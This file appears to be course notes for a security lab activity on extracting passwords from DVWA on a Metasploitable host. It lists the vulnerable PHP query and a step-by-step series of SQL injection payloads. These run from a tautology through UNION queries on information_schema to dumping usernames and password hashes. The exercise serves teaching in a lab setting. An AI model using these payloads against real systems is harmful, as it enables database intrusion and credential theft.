@@ -1,0 +1,30 @@
+Activity 2.6.2 – Grabbing Passwords with SQL Injection
+---------------------------------------------------------------------------------------------------
+
+$getid = "SELECT first_name, last_name FROM users WHERE user_id = '$id'";
+
+http://<Metasploitable IP>/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#
+
+SELECT first_name, last_name FROM users WHERE user_id = '3';
+
+SELECT first_name, last_name FROM users WHERE user_id = ' haha' or '1'='1 ';
+
+'
+
+haha' or 1=1 UNION select null, version() #
+
+---------------------------------------------------------------------------------------------------
+
+haha' or 1=1 UNION select null, user() #
+
+haha' or 1=1 UNION select null, table_name from information_schema.tables #
+
+haha' or 1=1 UNION select null, table_name from information_schema.tables where table_name like 'user%'#
+
+haha' or 1=1 UNION select null, table_name from information_schema.tables where table_name = 'users'#
+
+haha' or 1=1 UNION select null, concat(table_name,0x0a,column_name) from information_schema.columns where table_name = 'users' #
+
+haha' or 1=1 UNION select null, concat(first_name,0x0a,last_name,0x0a,user,0x0a,password) from users 
+
+
